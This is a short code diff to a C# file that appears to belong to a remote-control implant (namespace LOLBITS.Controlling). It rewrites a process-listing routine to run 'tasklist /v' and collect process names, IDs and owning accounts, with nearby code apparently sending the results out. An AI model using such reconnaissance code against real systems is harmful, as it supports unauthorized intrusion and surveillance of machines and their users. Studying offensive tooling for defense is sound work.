@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Diagnostics;
 using System.IO;
+using System.Linq;
 using System.Management;
 using System.Reflection;
 using System.Text;
@@ -311,7 +312,7 @@ namespace LOLBITS.Controlling
                         }
                 }
             } 
-            catch
+            catch(Exception e)
             {
                 rps = "ERR: Something went wrong!";
             }
@@ -322,17 +323,27 @@ namespace LOLBITS.Controlling
             TrySend(filePath);
         }
 
-        private static string GetProcessInfo()
+        private  string GetProcessInfo()
         {
             var output = "\n";
-            output = string.Concat(output, $"{"NAME",30}|{"PID",10}|{"ACCOUNT",20}|\n");
+            output = string.Concat(output, $"{"NAME",40}|{"PID",10}|{"ACCOUNT",40}|\n");
+            var cmd = "tasklist /v /fo csv";
 
-            foreach (var process in Process.GetProcesses())
+            var o = Utils.ExecuteCommand(cmd, _sysCall);
+            var spl = o.Split('\n');
+            spl = spl.Skip(1).ToArray();
+
+            foreach (var r in spl)
             {
-                var name = process.ProcessName;
-                var processId = process.Id;
+                var s = r.Split(',');
+                if (s.Length >= 6)
+                {
 
-                output = string.Concat(output, $"{name,30}|{processId,10}|{GetProcessOwner(processId),20}|\n");
+                    var name = s[0].Replace("\"","");
+                    var processId = s[1].Replace("\"", ""); ;
+                    var owner = s[6].Replace("\"", ""); ;
+                    output = string.Concat(output, $"{name,40}|{processId,10}|{owner,40}|\n");
+                }
             }
 
             return output;
